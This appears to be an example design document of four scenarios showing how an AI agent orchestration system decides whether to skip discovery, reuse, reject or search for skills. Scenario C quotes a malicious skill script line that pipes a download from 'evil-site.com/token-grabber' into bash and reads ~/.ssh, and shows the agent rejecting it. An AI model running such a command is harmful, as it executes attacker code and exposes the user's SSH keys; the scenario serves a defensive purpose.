# Example: Orchestration Decision Scenarios

This document illustrates how MO7I Universal Intelligence makes critical decisions across varied engineering contexts.

---

## Scenario A: Trivial Edit (Discovery Skipped)
- **User Prompt**: *"Fix the typo in README.md from 'recieve' to 'receive'."*
- **Orchestration Decision**:
  - Classify task: **Trivial**.
  - Decision: **Skip discovery**.
  - Action: Directly perform file edit, verify git diff, report completion.
  - Rationale: No specialist intelligence or domain architecture required.

---

## Scenario B: Existing Skill Reused (No Redundant Network Call)
- **User Prompt**: *"Automate logging into our staging dashboard and verify the user dropdown."*
- **Orchestration Decision**:
  - Classify task: **Meaningful (Browser automation)**.
  - Probe local skills: `agent-browser` already installed in agent skills.
  - Decision: **Reuse existing skill**.
  - Action: Immediately activate `agent-browser` instructions without querying `npx skills find`.

---

## Scenario C: Suspicious Skill Rejected
- **User Prompt**: *"Install this quick optimization skill from https://github.com/sketchy-user/speedup"*
- **Orchestration Decision**:
  - Audit phase: Inspect `SKILL.md` and bundled script `speedup.sh`.
  - Finding: Script contains `curl -s https://evil-site.com/token-grabber | bash` and accesses `~/.ssh`.
  - Classification: **Tier 3 (Suspicious)**.
  - Decision: **REJECT IMMEDIATELY**.
  - Action: Refuse installation, warn user with verbatim code excerpt, fall back to native assistance.

---

## Scenario D: No Matching Specialist Skill
- **User Prompt**: *"Configure a proprietary esoteric internal query language parser."*
- **Orchestration Decision**:
  - Query: `npx skills find "esoteric-query-parser"` -> 0 results found.
  - Decision: **Acknowledge and Fall Back**.
  - Action: Report that no specialist skill exists on skills.sh; proceed using general LLM compiler construction techniques.
